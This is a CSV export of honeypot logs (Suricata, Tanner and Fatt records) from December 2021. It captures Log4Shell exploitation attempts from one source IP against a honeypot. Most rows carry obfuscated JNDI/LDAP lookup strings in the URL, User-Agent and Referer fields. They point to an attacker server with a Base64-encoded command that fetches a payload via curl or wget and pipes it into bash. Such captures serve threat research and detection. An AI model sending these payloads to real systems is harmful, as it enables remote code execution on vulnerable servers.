"@timestamp","@version","_id","_index","_score","_type","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","app_proto","cookies.sess_uuid","dest_ip","dest_port","ecs.version","event_type","fatt_http.clientHeaderHash","fatt_http.clientHeaderOrder","fatt_http.requestFullURI","fatt_http.requestMethod","fatt_http.requestURI","fatt_http.requestVersion","fatt_http.userAgent","fileinfo.filename","fileinfo.gaps","fileinfo.magic","fileinfo.md5","fileinfo.sid","fileinfo.size","fileinfo.state","fileinfo.stored","fileinfo.tx_id","flow_id","geoip.as_org","geoip.asn","geoip.city_name","geoip.continent_code","geoip.country_code2","geoip.country_code3","geoip.country_name","geoip.dma_code","geoip.ip","geoip.latitude","geoip.location","geoip.longitude","geoip.postal_code","geoip.region_code","geoip.region_name","geoip.timezone","headers.accept-encoding","headers.connection","headers.host","headers.referer","headers.user-agent","host.name","http.accept_encoding","http.hostname","http.http_content_type","http.http_method","http.http_port","http.http_refer","http.http_user_agent","http.length","http.protocol","http.status","http.url","in_iface","input.type","ip_rep","log.file.path","log.offset",message,"metadata.flowints.tcp.retransmission.count",method,path,proto,protocol,"response_msg.response.message.detection.name","response_msg.response.message.detection.order","response_msg.response.message.detection.type","response_msg.response.message.detection.version","response_msg.response.message.sess_uuid","response_msg.version","src_ip","src_port",status,"t-pot_hostname","t-pot_ip_ext","t-pot_ip_int",tags,timestamp,"tx_id",type,uuid
"2021-12-16T15:03:44.668Z",1,PtXFw30B6VkG8jKzUHH3,"logstash-suricata-2021.12.16",,"_doc","d18730d7-7fe8-4349-b555-84f8a6856291",6f5fc241e151,"267f31b7-93ce-4f02-89b4-0566439440e1",6f5fc241e151,filebeat,"7.11.1",,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,476998351730960,,,,,,,,,,,,,,,,,,,,,,6f5fc241e151,gzip,"172.16.0.42","text/html",GET,80,"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",10803,"HTTP/1.1",200,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",eth0,log,,"/data/suricata/log/eve.json",45299388,"{""timestamp"":""2021-12-16T15:03:44.668912+0000"",""flow_id"":476998351730960,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.54.160.149"",""src_port"":38170,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""http_port"":80,""url"":""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_user_agent"":""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip"",""http_refer"":""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":10803}}",,,,TCP,,,,,,,,"195.54.160.149",38170,,burninglife,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:03:44.668912+0000",0,Suricata,
"2021-12-16T15:03:44.668Z",1,P9XFw30B6VkG8jKzUHH3,"logstash-suricata-2021.12.16",,"_doc","d18730d7-7fe8-4349-b555-84f8a6856291",6f5fc241e151,"267f31b7-93ce-4f02-89b4-0566439440e1",6f5fc241e151,filebeat,"7.11.1",http,,"195.54.160.149",38170,"1.6.0",fileinfo,,,,,,,,"/",false,"HTML document, Unicode text, UTF-8 text",c62e5675e85098667aceb6d9c154af41,"[]",10803,CLOSED,false,0,476998351730960,"Digital Ocean, Inc.",14061,Bengaluru,AS,IN,IN,India,,"172.16.0.42","12.9771","{""lat"":12.9771,""lon"":77.5871}","77.5871",560100,KA,Karnataka,"Asia/Kolkata",,,,,,6f5fc241e151,,"172.16.0.42","text/html",GET,80,"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",10803,"HTTP/1.1",200,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",eth0,log,"known attacker","/data/suricata/log/eve.json",45300485,"{""timestamp"":""2021-12-16T15:03:44.668912+0000"",""flow_id"":476998351730960,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""195.54.160.149"",""dest_port"":38170,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""http_port"":80,""url"":""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_user_agent"":""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_content_type"":""text/html"",""http_refer"":""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":10803},""app_proto"":""http"",""fileinfo"":{""filename"":""/"",""sid"":[],""magic"":""HTML document, Unicode text, UTF-8 text"",""gaps"":false,""state"":""CLOSED"",""md5"":""c62e5675e85098667aceb6d9c154af41"",""stored"":false,""size"":10803,""tx_id"":0}}",,,,TCP,,,,,,,,"172.16.0.42",80,,burninglife,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-16T15:03:44.668912+0000",,Suricata,
"2021-12-16T15:03:44.456Z",1,g3PFw30B5e7x5EYnUSkG,"logstash-tanner-2021.12.16",,"_doc","d18730d7-7fe8-4349-b555-84f8a6856291",6f5fc241e151,"267f31b7-93ce-4f02-89b4-0566439440e1",6f5fc241e151,filebeat,"7.11.1",,,,80,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,gzip,close,"172.16.0.42:80","${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",6f5fc241e151,,,,,,,,,,,,,log,,"/data/tanner/log/tanner_report.json",53743,"{""method"": ""GET"", ""path"": ""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""headers"": {""host"": ""172.16.0.42:80"", ""user-agent"": ""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""referer"": ""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""accept-encoding"": ""gzip"", ""connection"": ""close""}, ""uuid"": ""9cb7c9ef-211c-47e3-a7ea-a3afb98ce6a5"", ""peer"": {""ip"": ""195.54.160.149"", ""port"": 38170}, ""status"": 200, ""cookies"": {""sess_uuid"": null}, ""response_msg"": {""version"": ""0.6.0"", ""response"": {""message"": {""detection"": {""name"": ""index"", ""order"": 1, ""type"": 1, ""version"": ""0.6.0""}, ""sess_uuid"": ""b692a6ef-bf6c-49b5-8bd7-7dbb019bdd29""}}}, ""timestamp"": ""2021-12-16T15:03:44.456842""}",,GET,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",,,index,1,1,"0.6.0","b692a6ef-bf6c-49b5-8bd7-7dbb019bdd29","0.6.0","195.54.160.149",38170,200,burninglife,"172.16.0.42","172.16.0.42","[""tanner"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:03:44.456842",,Tanner,"9cb7c9ef-211c-47e3-a7ea-a3afb98ce6a5"
"2021-12-16T15:03:44.447Z",1,BNXFw30B6VkG8jKzSnF2,"logstash-fatt-2021.12.16",,"_doc","d18730d7-7fe8-4349-b555-84f8a6856291",6f5fc241e151,"267f31b7-93ce-4f02-89b4-0566439440e1",6f5fc241e151,filebeat,"7.11.1",,,"172.16.0.42",80,"1.6.0",,49c8cce3278bc4baa97c1f40b0cdc568,"request_uri_path,request_uri_query,request_uri_query_parameter,host,user_agent,referer,accept_encoding,connection","http://172.16.0.42:80/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",GET,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}","HTTP/1.1","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,6f5fc241e151,,,,,,,,,,,,,log,,"/data/fatt/log/fatt.log",4328014,"{""timestamp"": ""2021-12-16T15:03:44.447104"", ""sourceIp"": ""195.54.160.149"", ""destinationIp"": ""172.16.0.42"", ""sourcePort"": ""38170"", ""destinationPort"": ""80"", ""protocol"": ""http"", ""http"": {""requestURI"": ""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""requestFullURI"": ""http://172.16.0.42:80/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""requestVersion"": ""HTTP/1.1"", ""requestMethod"": ""GET"", ""userAgent"": ""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzkuNTkuNTguNjg6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTM5LjU5LjU4LjY4OjgwKXxiYXNo}"", ""clientHeaderOrder"": ""request_uri_path,request_uri_query,request_uri_query_parameter,host,user_agent,referer,accept_encoding,connection"", ""clientHeaderHash"": ""49c8cce3278bc4baa97c1f40b0cdc568""}}",,,,,http,,,,,,,"195.54.160.149",38170,,burninglife,"172.16.0.42","172.16.0.42","[""fatt"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:03:44.447104",,Fatt,
"2021-12-16T15:02:08.080Z",1,OwfDw30BCXMCNTQLzwYs,"logstash-suricata-2021.12.16",,"_doc","aec68d77-e6de-4e07-992a-6b44c28a1071",05b640e538c0,"6e9a1b84-60e1-49af-8956-a443c5929864",05b640e538c0,filebeat,"7.11.1",,,"172.16.0.42",8080,"1.6.0",http,,,,,,,,,,,,,,,,,1121069493588118,,,,,,,,,,,,,,,,,,,,,,05b640e538c0,gzip,"172.16.0.42",,GET,8080,"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}",0,"HTTP/1.1",200,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}",eth0,log,,"/data/suricata/log/eve.json",30724792,"{""timestamp"":""2021-12-16T15:02:08.080689+0000"",""flow_id"":1121069493588118,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.54.160.149"",""src_port"":58804,""dest_ip"":""172.16.0.42"",""dest_port"":8080,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""http_port"":8080,""url"":""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}"",""http_user_agent"":""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}"",""accept_encoding"":""gzip"",""http_refer"":""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNTkuMjIzLjUuMTM2OjgwODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMTU5LjIyMy41LjEzNjo4MDgwKXxiYXNo}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,TCP,,,,,,,,"195.54.160.149",58804,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:02:08.080689+0000",0,Suricata,
"2021-12-16T15:00:55.084Z",1,K3PCw30B5e7x5EYnsQ1z,"logstash-suricata-2021.12.16",,"_doc","797ba907-3613-44b1-ab2c-2049741d94b6",44b31b82da30,"9e531e9c-1393-49ce-8d78-797f6ec13c35",44b31b82da30,filebeat,"7.11.1",,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,552579027631596,,,,,,,,,,,,,,,,,,,,,,44b31b82da30,gzip,"172.16.0.42","text/html",GET,80,"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}",52671,"HTTP/1.1",200,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}",eth0,log,,"/data/suricata/log/eve.json",56523999,"{""timestamp"":""2021-12-16T15:00:55.084702+0000"",""flow_id"":552579027631596,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.54.160.149"",""src_port"":46168,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""http_port"":80,""url"":""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_user_agent"":""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip"",""http_refer"":""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":52671}}",,,,TCP,,,,,,,,"195.54.160.149",46168,,loudwheel,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:00:55.084702+0000",0,Suricata,
"2021-12-16T15:00:55.084Z",1,LHPCw30B5e7x5EYnsQ1z,"logstash-suricata-2021.12.16",,"_doc","797ba907-3613-44b1-ab2c-2049741d94b6",44b31b82da30,"9e531e9c-1393-49ce-8d78-797f6ec13c35",44b31b82da30,filebeat,"7.11.1",http,,"195.54.160.149",46168,"1.6.0",fileinfo,,,,,,,,"/",false,"HTML document, Unicode text, UTF-8 text, with very long lines (2102)",bb01c1060ecc1bf4eb4f6a2291787714,"[]",52671,CLOSED,false,0,552579027631596,,,London,EU,GB,GB,"United Kingdom",,"172.16.0.42","51.5353","{""lat"":51.5353,""lon"":-0.6658}","-0.6658",SL1,ENG,England,"Europe/London",,,,,,44b31b82da30,,"172.16.0.42","text/html",GET,80,"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}",52671,"HTTP/1.1",200,"/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}",eth0,log,,"/data/suricata/log/eve.json",56525110,"{""timestamp"":""2021-12-16T15:00:55.084702+0000"",""flow_id"":552579027631596,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""195.54.160.149"",""dest_port"":46168,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""http_port"":80,""url"":""/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_user_agent"":""${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_content_type"":""text/html"",""http_refer"":""${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMzQuMjA5LjI3LjE5OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzEzNC4yMDkuMjcuMTk6ODApfGJhc2g=}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":52671},""app_proto"":""http"",""fileinfo"":{""filename"":""/"",""sid"":[],""magic"":""HTML document, Unicode text, UTF-8 text, with very long lines (2102)"",""gaps"":false,""state"":""CLOSED"",""md5"":""bb01c1060ecc1bf4eb4f6a2291787714"",""stored"":false,""size"":52671,""tx_id"":0}}",,,,TCP,,,,,,,,"172.16.0.42",80,,loudwheel,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-16T15:00:55.084702+0000",,Suricata,
